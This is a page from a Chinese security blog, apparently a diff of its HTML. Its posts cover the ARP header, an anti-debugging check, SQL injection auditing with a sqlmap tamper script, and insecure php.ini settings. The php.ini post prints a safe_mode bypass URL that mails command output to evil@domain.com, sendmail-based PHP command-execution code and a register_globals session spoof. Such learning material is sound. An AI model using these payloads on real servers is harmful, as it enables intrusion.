-  <div class="post-block home">
-    <link itemprop="mainEntityOfPage" href="http://hl0rey.github.io/2018/02/17/ARP协议详解/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="博主">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="hl0rey's blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-            
-            <a href="/2018/02/17/ARP协议详解/" class="post-title-link" itemprop="url">ARP协议详解</a>
-          
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              
-                
-              
-
-              <time title="创建于：2018-02-17 22:48:20" itemprop="dateCreated datePublished" datetime="2018-02-17T22:48:20+08:00">2018-02-17</time>
-            </span>
-          
-            
-
-            
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">Bearbeitet am</span>
-                <time title="更新于：2018-02-21 23:07:22" itemprop="dateModified" datetime="2018-02-21T23:07:22+08:00">2018-02-21</time>
-              </span>
-            
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/code/" itemprop="url" rel="index"><span itemprop="name">code</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><pre><code>ARP协议就是把IP地址解析成MAC地址的协议，RARP协议就是把MAC地址解析成IP地址的协议．
-</code></pre><p>###　数据包头结构<br><img src="/2018/02/17/ARP协议详解/2.jpg" alt=""> </p>
-<pre><code>typedef struct arphdr //arp协议28字节
-{
-unsigned short hard_tpye;//硬件类型2字节 通常为01 (以太网地址)
-unsigned short protocol;//协议类型2字节 通常为80 (IP地址)
-unsigned char hard_length;//硬件地址长度1字节 通常为6
-unsigned char protocol_length;//协议地址长度1字节 通常为4 (IP协议)
-unsigned short operation_type;//操作类型 1为ARP请求，2为ARP应答，3为RARP请求，4为RARP应答
-unsigned char source_mac[6];//源物理地址
-struct in_addr source_ip;//源IP地址
-unsigned char destination_mac[6];//目的物理地址
-struct in_addr destination_ip;//目的IP地址
-}ARP_HEADER,*PARPHDR;
-</code></pre><h3 id="值得一提的是"><a href="#值得一提的是" class="headerlink" title="值得一提的是"></a>值得一提的是</h3><pre><code>操作类型字段，目前能支持到9
-
-5    DRARP(动态反向地址转换协议) Request
-6    DRARP Reply
-7    DRARP Error
-8    InARP(逆向地址转换协议) Request
-9    InARP Relpy
-
-DRARP对应的RFC文档编号为rfc1931
-</code></pre><h3 id="scapy"><a href="#scapy" class="headerlink" title="scapy"></a>scapy</h3><pre><code> 非常简单，直接构造即可．
-
-In [31]: a=ARP()
-In [32]: a.op=1
-
-In [33]: send(a)
-.
-Sent 1 packets.
-
-In [34]: a.op=2
-
-In [35]: send(a)
-.
-Sent 1 packets.
-
-In [36]: a.op=3
-
-In [37]: send(a)
-.
-Sent 1 packets.
-
-In [38]: a.op=4
-
-In [39]: send(a)
-.
-Sent 1 packets.
-
-In [40]: a.op=5
-
-In [41]: send(a)
-.
-Sent 1 packets.
-
-In [42]: a.op=6
-
-In [43]: send(a)
-.
-Sent 1 packets.
-
-In [44]: a.op=7
-
-In [45]: send(a)
-.
-Sent 1 packets.
-
-In [46]: a.op=8
-
-In [47]: send(a)
-.
-Sent 1 packets.
-
-In [48]: a.op=9
-
-In [49]: send(a)
-.
-Sent 1 packets.
-
-In [50]: a.op=10
-
-In [51]: send(a)
-.
-Sent 1 packets.
-
-In [52]: a.show()
-###[ ARP ]###
-  hwtype= 0x1
-  ptype= 0x800
-  hwlen= 6
-  plen= 4
-  op= 10
-  hwsrc= 18:d6:c7:0f:0a:87
-  psrc= 192.168.1.104
-  hwdst= 00:00:00:00:00:00
-  pdst= 0.0.0.0
-</code></pre><p>然后抓到的保存成了perfectarp.pcap.</p>
-
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-          <div class="post-eof"></div>
-        
-      </footer>
-  </div>
-  
-  
-  
-  </article>
-
-    
-        <article itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block home">
-    <link itemprop="mainEntityOfPage" href="http://hl0rey.github.io/2018/02/13/反调试之检测标题名和类名/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="博主">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="hl0rey's blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-            
-            <a href="/2018/02/13/反调试之检测标题名和类名/" class="post-title-link" itemprop="url">反调试之检测标题名和类名</a>
-          
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              
-                
-              
-
-              <time title="创建于：2018-02-13 10:27:39 / 更新于：16:12:46" itemprop="dateCreated datePublished" datetime="2018-02-13T10:27:39+08:00">2018-02-13</time>
-            </span>
-          
-            
-
-            
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/reverse/" itemprop="url" rel="index"><span itemprop="name">reverse</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>通过FindWindow函数，找到是否存在黑名单中的标题和类名．</p>
-<h3 id="涉及的函数"><a href="#涉及的函数" class="headerlink" title="涉及的函数"></a>涉及的函数</h3><p>FindWindow TerminateProcess GetProAddress OpenProcess Process32First Process32Next CreateToolhelp32Snapshot</p>
-<h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>使用CreateToolhelp32Snapshot拍摄进程快照，在使用 Process32First和 Process32Next获取进程信息，再用FindWindow查找是否有黑名单上的标题名或者类名，如果发现执行反调试的行为．</p>
-<h3 id="函数解析"><a href="#函数解析" class="headerlink" title="函数解析"></a>函数解析</h3><ul>
-<li><p>FindWindow</p>
-<pre><code>HWNDFindWindow
-
-(
-
-LPCSTRlpClassName, //一个类名
-
-LPCSTRlpWindowName //一个标题名
-
-);
-</code></pre></li>
-</ul>
-<p>首先按类名寻找，如果类名没有设置，则按标题名．<br>返回那个窗口的句柄．</p>
-<h3 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h3><p>如果发现函数列表中没有可疑函数，但是事实上程序执行了相关的操作，那么应该是隐式的函数调用，仔细寻找蛛丝马迹．</p>
-<h3 id="绕过手法"><a href="#绕过手法" class="headerlink" title="绕过手法"></a>绕过手法</h3><p>让函数找不到他想找的就行了．</p>
-
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-          <div class="post-eof"></div>
-        
-      </footer>
-  </div>
-  
-  
-  
-  </article>
-
-    
-        <article itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block home">
-    <link itemprop="mainEntityOfPage" href="http://hl0rey.github.io/2018/02/11/代码审计之SQL注入/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="博主">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="hl0rey's blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-            
-            <a href="/2018/02/11/代码审计之SQL注入/" class="post-title-link" itemprop="url">代码审计之SQL注入</a>
-          
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              
-                
-              
-
-              <time title="创建于：2018-02-11 12:45:55 / 更新于：21:41:52" itemprop="dateCreated datePublished" datetime="2018-02-11T12:45:55+08:00">2018-02-11</time>
-            </span>
-          
-            
-
-            
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/code/" itemprop="url" rel="index"><span itemprop="name">code</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p><img src="/2018/02/11/代码审计之SQL注入/SQL注入.jpg" alt=""> </p>
-<h3 id="基本注入类型"><a href="#基本注入类型" class="headerlink" title="基本注入类型"></a>基本注入类型</h3><h4 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a>数字型</h4><p>因为拼接到SQL语句的中数字型变量过滤不严而导致的漏洞．这种漏洞的利用很大的一个特点是不用闭合引号，但是可能需要闭合括号．<br>测试代码：test1.php<br>防护方法：直接用预编译，或者用intval转换变量类型．</p>
-<h4 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h4><p>SQL语句中拼进去一个过滤不严的字符串型变量．这种漏洞的利用需要闭合引号或者引号和括号．<br>测试代码：test2.php<br>防护方法：直接用预编译，或者用addslashes（碰上不恰当的编码转换，还会被绕过）．</p>
-<h3 id="利用技术"><a href="#利用技术" class="headerlink" title="利用技术"></a>利用技术</h3><p>这里的利用技术，主要指可以sqlmap一把梭的技术．<br>为了能精准触发漏洞，显得比较专业，就得用sqlmap的　–technique 参数<br>例如，–technique=BU 这样的话，sqlmap就只用布尔盲注和联合查询两种技术了．在加上自定义的tamper，就能精准触发漏洞了．<br>一个脚本例子（python2）：</p>
-<pre><code>#!/usr/bin/env python
-
-from lib.core.enums import PRIORITY
-
-__priority__ = PRIORITY.LOW
-
-def dependencies():
-    pass
-
-def tamper(payload, **kwargs):
-
-    retVal = payload
-
-    if payload:
-    retVal = &quot;&quot;
-    quote, doublequote, firstspace = False, False, False
-
-    for i in xrange(len(payload)):
-        if not firstspace:
-            if payload[i].isspace():
-                firstspace = True
-                retVal += &quot;+&quot;
-                continue
-
-        elif payload[i] == &apos;\&apos;&apos;:
-            quote = not quote
-
-        elif payload[i] == &apos;&quot;&apos;:
-            doublequote = not doublequote
-
-        elif payload[i] == &quot; &quot; and not doublequote and not quote:
-            retVal += &quot;+&quot;
-            continue
-
-        retVal += payload[i]
-
-    return retVal
-</code></pre><h3 id="注入触发"><a href="#注入触发" class="headerlink" title="注入触发"></a>注入触发</h3><h4 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h4><p>通过GET请求触发</p>
-<h4 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h4><p>通过POST请求触发</p>
-<h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>恶意请求经过转义或者过滤，没能实现攻击，但恶意数据正常入库，再程序另一处使用了恶意的变量，可能因为从自身取出数据，就疏于防范导致恶意请求被执行．<br>比如　处理后的数据　\’a\’ or 1=1 –+ 入库，取出时是　‘1’ or 1=1<br>只要有别的地方调用这段数据拼接进SQL语句，就被攻击了．</p>
-<h4 id="宽字节注入，不恰当的转换编码导致的注入"><a href="#宽字节注入，不恰当的转换编码导致的注入" class="headerlink" title="宽字节注入，不恰当的转换编码导致的注入"></a>宽字节注入，不恰当的转换编码导致的注入</h4><p>宽字节注入的本质是转换编码的时候，让一个或几个字节跟反斜杠合成一个字符，形象的来说就是＂吃掉反斜杠＂．所以不只是页面编码为gbk的时候才有宽字节注入，不只SQL注入，其他注入型的漏洞有可能有这个问题<br>测试代码：test3.php<br>参考链接：<br><a href="http://blog.csdn.net/u011721501/article/details/42874517" target="_blank" rel="noopener">http://blog.csdn.net/u011721501/article/details/42874517</a><br><a href="http://www.91ri.org/8611.html" target="_blank" rel="noopener">http://www.91ri.org/8611.html</a></p>
-
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-          <div class="post-eof"></div>
-        
-      </footer>
-  </div>
-  
-  
-  
-  </article>
-
-    
-        <article itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block home">
-    <link itemprop="mainEntityOfPage" href="http://hl0rey.github.io/2018/02/10/php-ini的不安全配置/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="博主">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="hl0rey's blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-            
-            <a href="/2018/02/10/php-ini的不安全配置/" class="post-title-link" itemprop="url">php.ini的不安全配置</a>
-          
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              
-                
-              
-
-              <time title="创建于：2018-02-10 21:27:45" itemprop="dateCreated datePublished" datetime="2018-02-10T21:27:45+08:00">2018-02-10</time>
-            </span>
-          
-            
-
-            
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">Bearbeitet am</span>
-                <time title="更新于：2018-02-11 10:56:35" itemprop="dateModified" datetime="2018-02-11T10:56:35+08:00">2018-02-11</time>
-              </span>
-            
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/code/" itemprop="url" rel="index"><span itemprop="name">code</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>参考链接<br><a href="http://www.jb51.net/article/5102.htm" target="_blank" rel="noopener">http://www.jb51.net/article/5102.htm</a><br><a href="http://blog.csdn.net/fz_flower/article/details/49509159" target="_blank" rel="noopener">http://blog.csdn.net/fz_flower/article/details/49509159</a></p>
-<h3 id="安全模式"><a href="#安全模式" class="headerlink" title="安全模式"></a>安全模式</h3><pre><code>本特性已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。
-</code></pre><p>安全模式<br><a href="http://php.net/manual/zh/features.safe-mode.php" target="_blank" rel="noopener">http://php.net/manual/zh/features.safe-mode.php</a><br>保护措施和安全模式<br><a href="http://php.net/manual/zh/ini.sect.safe-mode.php" target="_blank" rel="noopener">http://php.net/manual/zh/ini.sect.safe-mode.php</a><br>被安全模式限制的函数<br><a href="http://php.net/manual/zh/features.safe-mode.functions.php" target="_blank" rel="noopener">http://php.net/manual/zh/features.safe-mode.functions.php</a></p>
-<ul>
-<li>safe_mode<br>是否启用 PHP 的安全模式。 </li>
-</ul>
-<ul>
-<li><p>safe_mode_allowed_env<em>vars<br>设置某些环境变量可能是潜在的安全缺口。本指令包含有一个逗号分隔的前缀列表。在安全模式下，用户只能改变那些名字具有在这里提供的前缀的环境变量。默认情况下，用户只能设置以 PHP</em> 开头的环境变量（例如 PHP_FOO = BAR）。</p>
-<pre><code>如果本指令为空，PHP 将使用户可以修改任何环境变量！ 
-</code></pre></li>
-<li><p>safe_mode_exec_dir<br>如果 PHP 使用了安全模式，system() 和其它程序执行函数将拒绝启动不在此目录中的程序。必须使用 / 作为目录分隔符，包括 Windows 中。 </p>
-</li>
-</ul>
-<ul>
-<li><p>disable_functions<br>本指令允许你基于安全原因禁止某些函数。接受逗号分隔的函数名列表作为参数。 disable_functions 不受安全模式的影响。 本指令只能设置在 php.ini 中。例如不能将其设置在 httpd.conf。 </p>
-</li>
-<li><p>com.allow_dcom</p>
-<pre><code>自 PHP 4.0.5 起可用
-</code></pre></li>
-</ul>
-<p>如果打开此选项，PHP 将被允许以一个 D-COM（Distributed COM）客户方式操作并允许 PHP 脚本在远程服务器上实例化 COM 对象。</p>
-<h3 id="变量控制"><a href="#变量控制" class="headerlink" title="变量控制"></a>变量控制</h3><ul>
-<li><p>register_global</p>
-<pre><code>在 PHP &lt;= 4.2.3 时是 PHP_INI_ALL。 从 PHP 5.3.0 起不推荐使用。 在 PHP 5.4.0 中移除该选项。    
-</code></pre></li>
-</ul>
-<p>把EGPCS (Environment, GET, POST, Cookie, Server)注册成全局变量．<br>该项不能在脚本中用ini_set()来配置，但是可以用.htaccess来配置，如　php_flag register_globals off. </p>
-<ul>
-<li><p>magic_quotes_gpc</p>
-<pre><code>本特性已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。
-</code></pre></li>
-</ul>
-<p>远近闻名，魔术引号．<br><a href="http://php.net/manual/zh/info.configuration.php#ini.magic-quotes-gpc" target="_blank" rel="noopener">http://php.net/manual/zh/info.configuration.php#ini.magic-quotes-gpc</a></p>
-<h3 id="远程文件"><a href="#远程文件" class="headerlink" title="远程文件"></a>远程文件</h3><ul>
-<li><p>allow_url_include<br>php.net/manual/zh/filesystem.configuration.php#ini.allow-url-include<br>允许这几个函数（include, include_once, require, require_once）用通过url来包含文件（FTP,HTTP协议）</p>
-</li>
-<li><p>allow_url_fopen<br><a href="http://php.net/manual/zh/filesystem.configuration.php#ini.allow-url-fopen" target="_blank" rel="noopener">http://php.net/manual/zh/filesystem.configuration.php#ini.allow-url-fopen</a></p>
-</li>
-</ul>
-<h3 id="目录配置"><a href="#目录配置" class="headerlink" title="目录配置"></a>目录配置</h3><ul>
-<li><p>expose_php<br>泄漏php版本信息<br>隐藏这个模样的（X-Powered-By: PHP/5.3.7）的相应头．</p>
-</li>
-<li><p>upload_tmp_dir<br>设置临时目录位置</p>
-</li>
-<li><p>open_basedir<br><a href="http://php.net/manual/zh/ini.core.php#ini.open-basedir" target="_blank" rel="noopener">http://php.net/manual/zh/ini.core.php#ini.open-basedir</a><br>将 PHP 所能打开的文件限制在指定的目录树，包括文件本身。本指令不受安全模式打开或者关闭的影响。 </p>
-</li>
-</ul>
-<h3 id="错误信息"><a href="#错误信息" class="headerlink" title="错误信息"></a>错误信息</h3><ul>
-<li>display_errors<br>是否回显错误，调试的时候打开</li>
-<li>error_reporting<br>错误显示级别</li>
-</ul>
-<h2 id="不安全配置的利用"><a href="#不安全配置的利用" class="headerlink" title="不安全配置的利用"></a>不安全配置的利用</h2><h3 id="safe-mode绕过漏洞"><a href="#safe-mode绕过漏洞" class="headerlink" title="safe_mode绕过漏洞"></a>safe_mode绕过漏洞</h3><p>还有PHP-4.2.2以下到PHP-4.0.5版本都存在PHP mail函数绕过safe_mode限制执行命令漏洞，4.0.5版本开始mail函数增加了第五个参数，由于设计者考虑不周可以突破safe_mode的限制执行命令。其中4.0.5版本突破非常简单，只需用分号隔开后面加shell命令就可以了，比如存在PHP脚本evil.php： </p>
-<pre><code>&lt;? mail(&quot;foo@bar,&quot;foo&quot;,&quot;bar&quot;,&quot;&quot;,$bar); ?&gt;  
-</code></pre><p>执行如下的URL： </p>
-<pre><code>http://foo.com/evil.php?bar=;/usr/bin/id|mail evil@domain.com 
-</code></pre><p>这将id执行的结果发送给<br>evil@domain.com </p>
-<p>对于4.0.6至4.2.2的PHP突破safe_mode限制其实是利用了sendmail的-C参数，所以系统必须是使用sendmail。如下的代码能够突破safe_mode限制执行命令： </p>
-<pre><code>&lt;? 
-# 注意，下面这两个必须是不存在的，或者它们的属主和本脚本的属主是一样 
-$script=&quot;/tmp/script123&quot;; 
-$cf=&quot;/tmp/cf123&quot;; 
-
-$fd = fopen($cf, &quot;w&quot;); 
-fwrite($fd, &quot;OQ/tmp 
-Sparse=0 
-R$*&quot; . chr(9) . &quot;$#local $@ $1 $: $1 
-Mlocal, P=/bin/sh, A=sh $script&quot;); 
-fclose($fd); 
-
-$fd = fopen($script, &quot;w&quot;); 
-fwrite($fd, &quot;rm -f $script $cf; &quot;); 
-fwrite($fd, $cmd); 
-fclose($fd); 
-
-mail(&quot;nobody&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;-C$cf&quot;); 
-?&gt; 
-</code></pre><p>还是使用以上有问题版本PHP的用户一定要及时升级到最新版本，这样才能消除基本的安全问题。  </p>
-<h3 id="全局变量伪造"><a href="#全局变量伪造" class="headerlink" title="全局变量伪造"></a>全局变量伪造</h3><p>test.php</p>
-<pre><code>&lt;?php
-if($_SESSION[&apos;username&apos;]==&quot;admin&quot;){
-    echo &quot;you is admin!&quot;;
-}
-?&gt;
-</code></pre><p>如果register_global模式为On的话，提交：</p>
-<pre><code>http://host/test.php?_SESSION[username]=admin
-</code></pre><p>就能绕过了．</p>
-
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-          <div class="post-eof"></div>
-        
-      </footer>
-  </div>
-  
-  
-  
-  </article>
-
-    
-        <article itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block home">
-    <link itemprop="mainEntityOfPage" href="http://hl0rey.github.io/2018/02/10/代码审计大的思路/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="博主">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="hl0rey's blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-            
-            <a href="/2018/02/10/代码审计大的思路/" class="post-title-link" itemprop="url">代码审计大的思路</a>
-          
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              
-                
-              
-
-              <time title="创建于：2018-02-10 21:06:12 / 更新于：23:00:35" itemprop="dateCreated datePublished" datetime="2018-02-10T21:06:12+08:00">2018-02-10</time>
-            </span>
-          
-            
-
-            
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/code/" itemprop="url" rel="index"><span itemprop="name">code</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <pre><code>拿到一套源码该从哪个地方开始审计，该用什么思路审计，是很值得思考的．    
-</code></pre><h3 id="通读原文"><a href="#通读原文" class="headerlink" title="通读原文"></a>通读原文</h3><p>是对代码能力要求比较高的一种方法，耗时多，但是有利于把握程序的逻辑，挖出逻辑漏洞，毕竟不只是getshell才叫漏洞．所期望的功能不能正常实现也是漏洞．</p>
-<h3 id="敏感关键字回溯"><a href="#敏感关键字回溯" class="headerlink" title="敏感关键字回溯"></a>敏感关键字回溯</h3><p>这个方法比较迅速，直接在源码里全文搜索关键字，比如可控的参数，编码解码等，容易出错的地方，或是危险函数，一旦发现问题，一般就是大问题，但是不容易挖到逻辑漏洞，因为对程序的功能不够了解</p>
-<h3 id="功能定向审计"><a href="#功能定向审计" class="headerlink" title="功能定向审计"></a>功能定向审计</h3><p>拿到源码之后先看看怎么用，有什么用，看看有啥功能，然后针对功能，黑白盒测试相结合，事半功倍．比如，程序安装，文件上传，文件管理，登录验证，备份，找回密码，购物车，评论等等．感觉这个方法比较高效一些．</p>
-
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-          <div class="post-eof"></div>
-        
-      </footer>
-  </div>
-  
-  
-  
-  </article>
-
-    
-  </div>
-
-  
-  <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Vorherige Seite"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="Nächste Seite"></i></a>
-  </nav>
-
-
-          </div>
-          
-
-        </div>
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside class="sidebar">
-    <div class="sidebar-inner">
-
-      <ul class="sidebar-nav motion-element">
-        <li class="sidebar-nav-toc">
-          文章目录
-        </li>
-        <li class="sidebar-nav-overview">
-          站点概览
-        </li>
-      </ul>
-
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
-      </div>
-      <!--/noindex-->
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <p class="site-author-name" itemprop="name">博主</p>
-  <div class="site-description" itemprop="description"></div>
-</div>
-  <nav class="site-state motion-element">
-      <div class="site-state-item site-state-posts">
-        
-          <a href="/archives/">
-        
-          <span class="site-state-item-count">34</span>
-          <span class="site-state-item-name">日志</span>
         </a>
-      </div>
+        
     
-      
-      
-      <div class="site-state-item site-state-categories">
         
-          
-            <a href="/categories/">
-          
-        
-        <span class="site-state-item-count">7</span>
-        <span class="site-state-item-name">分类</span>
+        <a title="github" href="https://github.com/yelog" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-github"></use>
+                </svg>
+            
         </a>
-      </div>
+        
     
-      
-      
-      <div class="site-state-item site-state-tags">
         
-          
-            <a href="/tags/">
-          
-        
-        <span class="site-state-item-count">14</span>
-        <span class="site-state-item-name">标签</span>
+        <a title="facebook" href="https://www.facebook.com/faker.tops" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-facebook"></use>
+                </svg>
+            
         </a>
-      </div>
+        
     
-  </nav>
+        
+    
+        
+    
+        
+        <a title="instagram" href="https://www.facebook.com/faker.tops" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-instagram"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="reddit" href="https://www.reddit.com/user/yelog/" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-reddit"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="weibo" href="http://weibo.com/u/2307534817" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-weibo"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="jianshu" href="https://www.jianshu.com/u/ff56736de7cf" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-jianshu"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="zhihu" href="https://www.zhihu.com/people/jaytp/activities" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-zhihu"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+    
+        
+        <a title="oschina" href="https://my.oschina.net/yelog" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-oschina"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+    
+        
+        <a title="email" href="mailto:jaytp@qq.com" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-email"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="qq" href="http://wpa.qq.com/msgrd?v=3&uin=872336115&site=qq&menu=yes" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-qq"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="kugou" href="https://www.kugou.com/" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-kugou"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="neteasemusic" href="https://music.163.com/#/user/home?id=88151013" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-neteasemusic"></use>
+                </svg>
+            
+        </a>
+        
+    
+</div>
 
 
 
-      </div>
+
+<ul>
+    <li><div class="all active">全部文章<small>(34)</small></div></li>
+    
+        
+            
+            <li><div data-rel="code">code<small>(13)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="reverse">reverse<small>(5)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="tools">tools<small>(6)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="linux">linux<small>(1)</small></div>
+                
+            </li>
